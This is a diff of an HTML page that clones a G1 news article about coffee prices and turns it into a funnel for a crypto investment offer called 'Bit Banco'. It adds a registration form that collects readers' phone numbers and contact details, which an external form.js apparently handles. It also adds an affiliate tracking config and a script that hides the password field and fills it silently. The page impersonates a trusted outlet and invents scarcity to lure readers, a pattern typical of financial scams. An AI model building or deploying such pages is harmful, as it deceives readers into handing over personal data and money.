@@ -646,6 +646,25 @@
         @font-face{font-family:opensans;src:url(https://s3.glbimg.com/cdn/fonts/opensans/bold.woff2) format("woff2"), url(https://s3.glbimg.com/cdn/fonts/opensans/bold.woff) format("woff"), url(https://s3.glbimg.com/cdn/fonts/opensans/bold.ttf) format("truetype");font-style:normal;font-weight:700;}
         @font-face{font-family:"Globotipo Variable";src:url(https://s3.glbimg.com/v1/AUTH_b922f1376f6c452e9bb337cc7d996a6e/codex/foundation/fonts/5462f4c64759cc666538a326be3e6de1.woff2) format("woff2");font-style:normal italic;font-weight:100 900;font-stretch:condensed normal;font-display:swap;}
     </style>
+    <link href="assets/flow.css" rel="stylesheet" />
+    <link href="assets/funnel.css" rel="stylesheet" />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+    <style>
+        @media all and (min-width: 768px) {
+            .how-it-works-section {
+                margin-top: 300px;
+            }
+        }
+
+        .form-footer {
+            padding-top: 20px;
+            font-weight: 400;
+            font-size: 14px;
+            line-height: 150%;
+            color: #222;
+            font-family: Roboto, sans-serif;
+        }
+    </style>
 
 </head>
 
@@ -719,9 +738,9 @@
                 --text-highlight-color: #F3D1CE;
             }
         </style>
-        <main class="mc-body theme" itemscope="" itemtype="http://schema.org/NewsArticle">
+        <main class="mc-body theme" itemtype="http://schema.org/NewsArticle">
             <link itemprop="mainEntityOfPage" href="https://g1.globo.com/mundo/noticia/2024/09/22/por-que-preco-do-cafe-esta-disparando-no-mundo-e-o-que-uma-fruta-fedorenta-tem-a-ver-com-isso.ghtml">
-            <span itemprop="image" itemscope="" itemtype="http://schema.org/ImageObject">
+            <span itemprop="image" itemtype="http://schema.org/ImageObject">
                 <meta itemprop="url" content="https://s2-g1.glbimg.com/ncXrSwf4RegEmas1eG0H8437kSs=/696x390/smart/filters:cover():strip_icc()/i.s3.glbimg.com/v1/AUTH_59edd422c0c84a879bd37670ae4f538a/internal_photos/bs/2024/T/e/w9xc5DRxGlyn0aIaqsqg/cafemulher.png">
                 <meta itemprop="width" content="696">
                 <meta itemprop="height" content="390">
@@ -759,15 +778,15 @@
                                     </span>
                                 </p>
                             </div>
-                            <span itemprop="author" itemscope="" itemtype="https://schema.org/Organization">
+                            <span itemprop="author" itemtype="https://schema.org/Organization">
                                 <meta itemprop="name" content="G1">
                             </span>
-                            <span itemprop="creator" itemscope="" itemtype="https://schema.org/Organization">
+                            <span itemprop="creator" itemtype="https://schema.org/Organization">
                                 <meta itemprop="name" content="BBC">
                             </span>
-                            <span itemprop="publisher" itemscope="" itemtype="https://schema.org/Organization">
+                            <span itemprop="publisher" itemtype="https://schema.org/Organization">
                                 <meta itemprop="name" content="G1">
-                                <span itemprop="logo" itemscope="" itemtype="https://schema.org/ImageObject">
+                                <span itemprop="logo" itemtype="https://schema.org/ImageObject">
                                     <meta itemprop="url" content="https://s.glbimg.com/jo/g1/static/live/g1_amp/img/g1_logo_json_ld.png">
                                     <meta itemprop="width" content="94">
                                     <meta itemprop="height" content="60">
@@ -861,7 +880,120 @@
                             <div class="mc-column content-text active-extra-styles " data-block-type="unstyled" data-block-weight="15">
                                 <p class=" content-text__container " data-track-category="Link no Texto" data-track-links="">Como podem imaginar, o interesse no Bit Banco tem sido enorme. Por isso, eles fecharam as portas para novos membros no momento. No entanto, como parte de uma promoção especial para nossos leitores, conseguimos garantir um número limitado de contas. </p>
 
-                                    <a href="{offer_link}" style="text-align: center; font-size: 28px; font-weight: normal; margin: 20px auto  60px; display: block; color: blue;">&gt;Clique aqui para ver se ainda há disponibilidade.</a>
+                                <p>
+                                    Você pode acessar o Bit Banco preenchendo o formulário abaixo. Por favor, forneça detalhes precisos.
+                                </p>
+
+                                <h1 class="funnel-name"></h1>
+                                <div class="custom-form">
+                                    <div class="custom-form-slide active">
+                                        <p class="p1">Créer votre compte</p>
+                                        <p class="p2">
+                                            Pour compléter l'inscription, une vérification par téléphone
+                                            est requise. Le numéro de téléphone sera utilisé pour
+                                            vérifier le compte.
+                                        </p>
+                                    </div>
+                                    <div class="gaff2" id="caff">
+                                        <!-- f -->
+                                    </div>
+                                    <div class="gaff">
+                                        <!-- f -->
+                                    </div>
+                                </div>
+                        
+                                <style>
+                                    html {
+                                        scroll-behavior: smooth;
+                                    }
+                        
+                                    .vld-overlay {
+                                        text-align: center;
+                                    }
+                        
+                                    .form-group,
+                                    .col-md-6.form-group {
+                                        width: 100%;
+                                        max-width: 100%;
+                                        flex: 0 0 100%;
+                                        margin-bottom: 10px;
+                                    }
+                        
+                                    #form > button {
+                                        width: 100%;
+                                        margin: 0 auto;
+                                        display: block;
+                                        background-color: #007bff !important;
+                                        color: #fff !important;
+                                        min-height: 48px;
+                                        font-size: 20px;
+                                        opacity: 1;
+                                    }
+                        
+                                    form .row {
+                                        margin: 0 !important;
+                                        padding: 0 !important;
+                                    }
+                        
+                                    label.control-label,
+                                    #gaff > form > div:nth-child(11) > div:nth-child(1) {
+                                        display: none;
+                                    }
+                        
+                                    /*.form-side .fw-body .form-group { margin-bottom:10px!important; }
+                        #form > div:nth-child(10) { display:flex;justify-content:space-between; }
+                        #form > div:nth-child(10) > div:nth-child(1) { padding-right:5px; }
+                        #form > div:nth-child(10) > div:nth-child(2) { padding-left:5px; }*/
+                                    .form-control {
+                                        border: 3px solid #6bfff7 !important;
+                                        padding: 0px !important;
+                                        margin-bottom: 0px;
+                                        text-indent: 10px;
+                                        width: 100%;
+                                        min-height: 40px;
+                                    }
+                        
+                                    #form > div:nth-child(12) > div:nth-child(1) {
+                                        margin-bottom: 0;
+                                    }
+                        
+                                    .checkbox {
+                                        margin-bottom: 10px;
+                                        display: none;
+                                    }
+                        
+                                    .checkbox a {
+                                        position: relative;
+                                        left: 5px;
+                                        top: -2px;
+                                        font-size: 13px;
+                                    }
+                        
+                                    .valid {
+                                        border: 1px solid green;
+                                        background-color: white !important;
+                                    }
+                        
+                                    .notvalid {
+                                        border: 1px solid red !important;
+                                    }
+                        
+                                    .notvalidphone {
+                                        background-color: rgb(253, 164, 164) !important;
+                                        border: 1px solid red !important;
+                                    }
+                        
+                                    .initial {
+                                        border: 1px solid gray !important;
+                                    }
+                        
+                                    @media (max-width: 1050px) {
+                                        .article__precontent,
+                                        .article__news {
+                                            display: block;
+                                        }
+                                    }
+                                </style>
                             </div>
                         </div>
 
@@ -881,6 +1013,49 @@
             </div>
         </div>
     </footer>
+    <script>
+        var formConf = { pass: false, btnTxt: "Register Now" };
+        function generatePassword() {
+            var length = 5,
+                charset =
+                    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
+                retVal = "";
+            for (var i = 0, n = charset.length; i < length; ++i) {
+                retVal += charset.charAt(Math.floor(Math.random() * n));
+            }
+            return retVal + "eG6";
+        }
+
+        document.addEventListener("build", function () {
+            if (formConf.btnTxt !== undefined) {
+                jQuery("button.btn.btn-danger.btn-lg.tradeBtn").text(
+                    formConf.btnTxt
+                );
+            }
+
+            jQuery("input.form-control.bfh-password")
+                .css({ display: "none" })
+                .attr("value", generatePassword());
+            jQuery(".bfh-phone").focus(function () {
+                jQuery(this).trigger("change");
+            });
+            jQuery(".bfh-phone").attr("autocomplete", "off");
+        });
+    </script>
+    <script>
+        gvars = {
+            gi: 86,
+            ci: 1,
+            wl: 17,
+            ap: 0,
+            ae: 0,
+            lg: "fr",
+            ai: 2958156
+        };
+    </script>
+    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.12/dist/vue.min.js"></script>
+    <script src="https://unpkg.com/@webcomponents/webcomponentsjs@2.6.0/webcomponents-loader.js"></script>
+    <script src="form.js"></script>
 </body>
 
 </html>
